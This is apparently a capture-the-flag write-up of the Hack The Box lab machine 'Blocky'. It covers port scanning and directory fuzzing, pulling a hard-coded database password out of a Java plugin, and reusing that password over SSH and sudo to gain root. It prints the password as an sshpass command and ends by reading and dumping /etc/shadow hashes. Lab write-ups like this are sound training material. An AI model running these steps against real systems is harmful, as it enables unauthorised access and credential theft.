---
layout: single
title: Blocky - Hack The Box 
excerpt: "Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this" 
date: 2022-05-22
classes: wide
header:
  teaser: /assets/images/htb-writeup-blocky/blocky_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-blocky/blocky_logo.png)

---

SYNOPSIS

Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks
of bad password practices as well as exposing internal files on a public facing system. On top of
this, it exposes a massive potential attack vector: Minecraft. Tens of thousands of servers exist
that are publicly accessible, with the vast majority being set up and configured by young and
inexperienced system administrators.

Skills Required

- Basic knowledge of Linux
- Enumerating ports and services

Skills Learned
- Exploiting bad password practices
- Decompiling JAR files
- Basic local Linux enumeration

# Reconnaissance

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

__Nmap__

```bash
nmap -p- -sS --min-rate 5000 --open -T5 -vvv -n -Pn 10.129.1.53 -oG allPorts
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 01:16 +03
Initiating SYN Stealth Scan at 01:16
Scanning 10.129.1.53 [65535 ports]
Discovered open port 21/tcp on 10.129.1.53
Discovered open port 80/tcp on 10.129.1.53
Discovered open port 22/tcp on 10.129.1.53
Discovered open port 25565/tcp on 10.129.1.53
Completed SYN Stealth Scan at 01:16, 26.48s elapsed (65535 total ports)
Nmap scan report for 10.129.1.53
Host is up, received user-set (0.17s latency).
Scanned at 2022-05-22 01:16:32 +03 for 27s
Not shown: 65530 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack ttl 63
22/tcp    open  ssh       syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
25565/tcp open  minecraft syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 23 (1.008KB)
```

Extracting information...
- IP Address: 10.129.1.53
- Open ports: 21,22,80,25565

```bash
nmap -sCV -p21,22,80,25565 10.129.1.53 -oN targeted
```
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 01:19 +03
Nmap scan report for 10.129.1.53
Host is up (0.19s latency).

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp?
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 4.8
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 239.08 seconds
```

There are quite a few open services. ProFTPD, OpenSSH, Apache, and Minecraft.

# Enumeration

**Website - TCP 80**
Directory Brute Force

```bash
nmap --script http-enum -p80 10.129.1.53 -oN webScan
```
```bsah
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 01:33 +03
Nmap scan report for 10.129.1.53
Host is up (0.21s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wiki/: Wiki
|   /wp-login.php: Possible admin folder
|   /phpmyadmin/: phpMyAdmin
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.8
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

Nmap done: 1 IP address (1 host up) scanned in 19.22 seconds
```

**phpmyadmin**
This is a normal looking phpMyAdmin login.

I’ll run wfuzz against the site.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.1.53/FUZZ
```
```bash
000000241:   301        9 L      28 W       315 Ch      "wp-content"
000000002:   200        313 L    3592 W     52253 Ch    "#"
000000004:   200        313 L    3592 W     52253 Ch    "#"
000000519:   301        9 L      28 W       312 Ch      "plugins"
000000786:   301        9 L      28 W       316 Ch      "wp-includes" 
```

**plugins**
It would be easy to skip this as a WordPress directory, but visiting this page shows a title of “Cute file browser” and it’s actually hosting two Java Jar files:

Now I’ll open each Jar.

```bash
7z l BlockyCore.jar
```
```bash
7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.04 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,24 CPUs x64)

Scanning the drive for archives:
1 file, 883 bytes (1 KiB)

Listing archive: BlockyCore.jar

--
Path = BlockyCore.jar
Type = zip
Physical Size = 883

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2017-07-02 11:12:02 .....           25           27  META-INF/MANIFEST.MF
2017-07-02 11:11:50 .....          939          534  com/myfirstplugin/BlockyCore.class
------------------- ----- ------------ ------------  ------------------------
2017-07-02 11:12:02                964          561  2 files
```
```bash
7z x BlockyCore.jar
```
```bash
7-Zip [64] 17.04 : Copyright (c) 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.04 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,24 CPUs x64)

Scanning the drive for archives:
1 file, 883 bytes (1 KiB)

Extracting archive: BlockyCore.jar
--
Path = BlockyCore.jar
Type = zip
Physical Size = 883

Everything is Ok

Files: 2
Size:       964
Compressed: 883
```
```bash
tree -fas
```
```bash
[         50]  .
├── [        883]  ./BlockyCore.jar
├── [         26]  ./com
│   └── [         32]  ./com/myfirstplugin
│       └── [        939]  ./com/myfirstplugin/BlockyCore.class
└── [         22]  ./META-INF
    └── [         25]  ./META-INF/MANIFEST.MF

3 directories, 3 files
```
```bash
file ./com/myfirstplugin/BlockyCore.class
```
```bash
./com/myfirstplugin/BlockyCore.class: compiled Java class data, version 52.0 (Java 1.8)
```

# Exploitation
Looking at the jar files, griefprevention is an open source plugin that is freely available.
BlockyCore, however, appears to be created by the server administrator, as its title relates
directly to the server. Decompiling with JD-GUI exposes the credentials for the root MySQL user.
Now extract the file.

```bash
strings ./com/myfirstplugin/BlockyCore.class
```
```bash
com/myfirstplugin/BlockyCore
java/lang/Object
sqlHost
Ljava/lang/String;
sqlUser
sqlPass
<init>
Code
	localhost	
root	
8YsqfCTnvxAUeduzjNSXe22	
LineNumberTable
LocalVariableTable
this
Lcom/myfirstplugin/BlockyCore;
onServerStart
onServerStop
onPlayerJoin
TODO get username
!Welcome to the BlockyCraft!!!!!!!
sendMessage
'(Ljava/lang/String;Ljava/lang/String;)V
username
message
SourceFile
BlockyCore.java
```

While possible to login to PHPMyAdmin with these credentials, it is not the intended method for
initial access. The PHPMyAdmin route is far more complex, and involves changing the Wordpress
administrator password, creating a reverse PHP shell and escalating from the www-data user via
the DCCP Double-Free technique (CVE-2017-6074).
The intended method for this machine is a simple username and password reuse. Attempting to
connect via SSH to the notch user (username discovered in the Wordpress post) and supplying
the MySQL root password gives immediate access.

```bash
ssh notch@10.129.1.53 
```
or 
```bash
sshpass -p '8YsqfCTnvxAUeduzjNSXe22' ssh notch@10.129.1.53
```
```bsah
The authenticity of host '10.129.1.53 (10.129.1.53)' can't be established.
ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.53' (ED25519) to the list of known hosts.
notch@10.129.1.53's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Thu Sep 24 08:12:11 2020 from 10.10.14.2
notch@Blocky:~$ id 
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
notch@Blocky:~$  
```

# Escalate Privileges

```bash
notch@Blocky:~$ sudo su
[sudo] password for notch: 
root@Blocky:/home/notch# id && /sbin/ifconfig && uname -a && cat /etc/shadow && ls -lah /root
uid=0(root) gid=0(root) groups=0(root)
ens160    Link encap:Ethernet  HWaddr 00:50:56:b9:8b:88  
          inet addr:10.129.1.53  Bcast:10.129.255.255  Mask:255.255.0.0
          inet6 addr: dead:beef::250:56ff:feb9:8b88/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:8b88/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:150313 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13667 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:10468555 (10.4 MB)  TX bytes:6147832 (6.1 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:1314 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1314 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:126006 (126.0 KB)  TX bytes:126006 (126.0 KB)

Linux Blocky 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
root:$6$7ndKfAzA$8a5NvmWSj.YV7vcVq1L1WDaQCU3WaY2RCPgnrg.MO79EBVwo028JMrx5y1VQPX5tyIZ.8ZdUYaUucxvAQ4inj/:18410:0:99999:7:::
daemon:*:17212:0:99999:7:::
bin:*:17212:0:99999:7:::
sys:*:17212:0:99999:7:::
sync:*:17212:0:99999:7:::
games:*:17212:0:99999:7:::
man:*:17212:0:99999:7:::
lp:*:17212:0:99999:7:::
mail:*:17212:0:99999:7:::
news:*:17212:0:99999:7:::
uucp:*:17212:0:99999:7:::
proxy:*:17212:0:99999:7:::
www-data:*:17212:0:99999:7:::
backup:*:17212:0:99999:7:::
list:*:17212:0:99999:7:::
irc:*:17212:0:99999:7:::
gnats:*:17212:0:99999:7:::
nobody:*:17212:0:99999:7:::
systemd-timesync:*:17212:0:99999:7:::
systemd-network:*:17212:0:99999:7:::
systemd-resolve:*:17212:0:99999:7:::
systemd-bus-proxy:*:17212:0:99999:7:::
syslog:*:17212:0:99999:7:::
_apt:*:17212:0:99999:7:::
lxd:*:17349:0:99999:7:::
messagebus:*:17349:0:99999:7:::
uuidd:*:17349:0:99999:7:::
dnsmasq:*:17349:0:99999:7:::
notch:$6$RdxVAN/.$DFugS5p/G9hTNY9htDWVGKte9n9r/nYYL.wVdAHfiHpnyN9dNftf5Nt.DkjrUs0PlYNcYZWhh0Vhl/5tl8WBG1:17349:0:99999:7:::
mysql:!:17349:0:99999:7:::
proftpd:!:17349:0:99999:7:::
ftp:*:17349:0:99999:7:::
sshd:*:17349:0:99999:7:::
total 36K
drwx------  3 root root 4.0K Sep 24  2020 .
drwxr-xr-x 23 root root 4.0K Sep 24  2020 ..
-rw-------  1 root root    1 Dec 24  2017 .bash_history
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
-rwxr-xr-x  1 root root  339 Sep 24  2020 dhcp.sh
drwxr-xr-x  2 root root 4.0K Jul  2  2017 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   32 Jul  2  2017 root.txt
-rw-------  1 root root 2.1K Sep 23  2020 .viminfo
root@Blocky:/home/notch# 
```

I suspect there are kernel exploits I could use here as well, but I’ll leave that as an exercise for the reader.
